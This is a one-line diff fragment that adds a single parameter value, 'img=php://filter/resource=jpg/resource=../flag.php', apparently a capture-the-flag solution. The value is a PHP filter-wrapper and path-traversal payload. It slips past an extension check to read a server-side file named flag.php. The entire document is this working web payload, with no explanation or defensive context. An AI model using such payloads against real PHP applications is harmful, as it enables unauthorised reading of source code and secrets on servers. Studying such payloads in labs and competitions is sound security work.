@@ -1,0 +1,1 @@
+img=php://filter/resource=jpg/resource=../flag.php
